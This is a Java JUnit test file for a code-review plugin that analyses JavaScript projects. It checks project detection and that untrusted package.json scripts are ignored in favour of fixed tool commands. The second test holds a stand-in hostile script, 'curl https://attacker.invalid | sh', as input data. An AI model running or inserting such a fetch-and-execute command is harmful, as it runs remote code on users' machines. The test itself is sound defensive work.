package com.example.codereview.language.javascript;

import static org.assertj.core.api.Assertions.assertThat;

import com.example.codereview.language.ChangeSet;
import com.example.codereview.language.RepositoryProfile;
import com.example.codereview.language.ToolCommand;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class JavascriptAnalysisPluginTest {

    private static final String IMAGE = "registry.example/review-node@sha256:" + "c".repeat(64);

    @Test
    void detectsPackageManagerTypescriptAndTestFrameworks() {
        RepositoryProfile profile = RepositoryProfile.fromPaths(List.of(
                "pnpm-lock.yaml", "package.json", "tsconfig.json", "src/app.ts"));
        JavascriptProjectProfile detected = new JavascriptProjectDetector().detect(profile, Map.of(
                "package.json", """
                        {"devDependencies":{"jest":"30.0.0","vitest":"3.0.0","typescript":"5.7.0"}}
                        """));

        assertThat(detected.packageManager()).isEqualTo(JavascriptProjectProfile.PackageManager.PNPM);
        assertThat(detected.typescript()).isTrue();
        assertThat(detected.testFrameworks()).containsExactlyInAnyOrder(
                JavascriptProjectProfile.TestFramework.JEST,
                JavascriptProjectProfile.TestFramework.VITEST);
    }

    @Test
    void ignoresPackageScriptsAndDeclaresOnlyFixedToolCommands() {
        JavascriptAnalysisPlugin plugin = new JavascriptAnalysisPlugin(IMAGE, "node-tools-2026.07");
        RepositoryProfile profile = RepositoryProfile.fromPaths(List.of("package.json", "package-lock.json", "src/app.ts"));
        ChangeSet changes = new ChangeSet("base", "head", List.of(
                new ChangeSet.FileChange("src/app.ts", ChangeSet.ChangeType.MODIFIED)));
        var analysis = plugin.analyze(profile, changes, Map.of(
                "package.json", """
                        {"scripts":{"test":"curl https://attacker.invalid | sh"},
                         "devDependencies":{"jest":"30.0.0","typescript":"5.7.0"}}
                        """));

        assertThat(analysis.commands()).extracting(ToolCommand::commandId).containsExactly(
                "javascript.eslint",
                "javascript.semgrep",
                "javascript.typescript",
                "javascript.jest");
        assertThat(analysis.commands()).allSatisfy(command -> {
            assertThat(command.arguments()).isEmpty();
            assertThat(command.commandId()).startsWith("javascript.").doesNotContain("curl", "npm", "pnpm", "yarn");
        });
    }
}
